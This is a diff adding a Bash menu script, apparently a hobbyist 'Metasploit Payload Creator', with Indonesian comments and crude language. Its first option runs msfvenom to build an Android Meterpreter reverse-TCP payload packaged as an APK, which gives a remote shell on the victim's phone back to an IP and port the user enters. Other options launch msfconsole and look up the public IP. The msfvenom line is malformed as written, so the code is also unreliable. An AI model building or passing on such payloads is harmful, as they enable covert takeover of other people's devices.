@@ -1,0 +1,169 @@
+b='\033[34;1m'
+g='\033[32;1m'
+p='\033[35;1m'
+c='\033[36;1m'
+r='\033[31;1m'
+w='\033[37;1m'
+y='\033[33;1m'
+#----------------------------------------------------------------
+#Yah Ketauan Deh Gua Ngumpetin SC Nya Disini wkwk Kontol ;v
+#----------------------------------------------------------------
+#Terserah Lu Gan Mau Recode Tinggal Recode ;v Ini Tool Sampah :p
+#----------------------------------------------------------------
+clear
+green='\033[1;92m'
+red='\033[1;91m'
+echo "$b                           8888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "              888888888888888888888888888888888888"
+echo "$r                       888888888888888888"
+echo "                      88      8888      88"
+echo "                      88     88  88     88"
+echo "                       8888888    8888888"
+echo "                         88888888888888"
+echo "                            8 8  8 8"
+echo "                            8 8  8 8"
+echo "$b    __  _______  ______ |"
+echo "$b   /  |/  / __ \/ ____/ | $r [ Metasploit Payload Creator ]"
+echo "$b  / /|_/ / /_/ / /      |      $r  [ Coded Bodongs ] "
+echo "$b / /  / / ____/ /__     |$r [ https://github.com/Bodongs ]"
+echo "$b/_/  /_/_/    \____/    |       "
+echo "------------------------|"
+echo ""
+echo ""
+echo "$red[#] Checking Connection!"
+sleep 2
+if ping -q -c 1 -W 1 8.8.8.8 >/dev/null;
+then
+clear
+echo "$b                           8888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "              888888888888888888888888888888888888"
+echo "$r                       888888888888888888"
+echo "                      88      8888      88"
+echo "                      88     88  88     88"
+echo "                       8888888    8888888"
+echo "                         88888888888888"
+echo "                            8 8  8 8"
+echo "                            8 8  8 8"
+echo "$b    __  _______  ______ |"
+echo "$b   /  |/  / __ \/ ____/ | $r [ Metasploit Payload Creator ]"
+echo "$b  / /|_/ / /_/ / /      |      $r  [ Coded Bodongs ] "
+echo "$b / /  / / ____/ /__     |$r [ https://github.com/Bodongs ]"
+echo "$b/_/  /_/_/    \____/    |"
+echo "------------------------|"
+echo ""
+echo ""
+echo "$green[!] Internet Connected"
+sleep 2
+clear
+else
+clear
+echo "$b                           8888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "              888888888888888888888888888888888888"
+echo "$r                       888888888888888888"
+echo "                      88      8888      88"
+echo "                      88     88  88     88"
+echo "                       8888888    8888888"
+echo "                         88888888888888"
+echo "                            8 8  8 8"
+echo "                            8 8  8 8"
+echo "$b    __  _______  ______ |"
+echo "$b   /  |/  / __ \/ ____/ | $r [ Metasploit Payload Creator ]"
+echo "$b  / /|_/ / /_/ / /      |      $r  [ Coded Bodongs ] "
+echo "$b / /  / / ____/ /__     |$r [ https://github.com/Bodongs ]"
+echo "$b/_/  /_/_/    \____/    |"
+echo "------------------------|"
+echo ""
+echo ""
+echo "$r[X] No Internet Conncetion [X]"
+sleep 2
+echo "[!] you Must Connected Internet For Run This Tool !"
+sleep 2
+exit
+fi
+clear
+echo "$b                           8888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "                         88888888888888"
+echo "              888888888888888888888888888888888888"
+echo "$r                       888888888888888888"
+echo "                      88      8888      88"
+echo "                      88     88  88     88"
+echo "                       8888888    8888888"
+echo "                         88888888888888"
+echo "                            8 8  8 8"
+echo "                            8 8  8 8"
+echo "$b    __  _______  ______ |"
+echo "$b   /  |/  / __ \/ ____/ | $r [ Metasploit Payload Creator ]"
+echo "$b  / /|_/ / /_/ / /      |      $r  [ Coded Bodongs ] "
+echo "$b / /  / / ____/ /__     |$r [ https://github.com/Bodongs ]"
+echo "$b/_/  /_/_/    \____/    |"
+echo "------------------------|"
+echo ""
+echo ""
+echo " [1] Create Payload"
+echo ""
+echo " [2] Run Metaspolit"
+echo ""
+echo " [3] My Ip"
+echo ""
+echo " [4] Exit"
+echo ""                                                                      
+read -p " Input Your Choose => " mpc
+
+if [ $mpc = 1 ] || [ $mpc = 01 ]
+then
+cd ..
+cd metasploit-framework
+echo ""
+echo ""
+echo "$r"
+read -p "[!] Input Your Ip => " ip
+echo ""
+read -p "[!] Input Your Port  => " port
+echo ""
+read -p "[!] Save As Name => " nama
+echo ""
+echo "$g[#] Creating Payload .."
+
+./msfvenom -p android/meterpreter/reverse_tcp LHOST$ip =LPORT=$port R> /sdcard/$nama.apk
+echo ""
+echo ""
+echo "$gSaved Succes!Directory Sdcard name $nama.apk"
+sleep 3
+fi
+
+if [ $mpc = 2 ] || [ $mpc = 02 ]
+then
+clear
+cd ..
+cd metasploit-framework
+./msfconsole
+fi
+
+if [ $mpc = 3 ] || [ $mpc = 03 ]
+then
+echo "|---------------|"
+echo "|   Your Ip     |"
+echo "|---------------|"
+       curl ifconfig.me
+sleep 3
+sh mpc.sh
+fi
+
+if [ $mpc = 4 ] || [ $mpc = 04 ]
+then
+echo "Good Bye Motherfucker"
+sleep 1
+exit
+fi
+
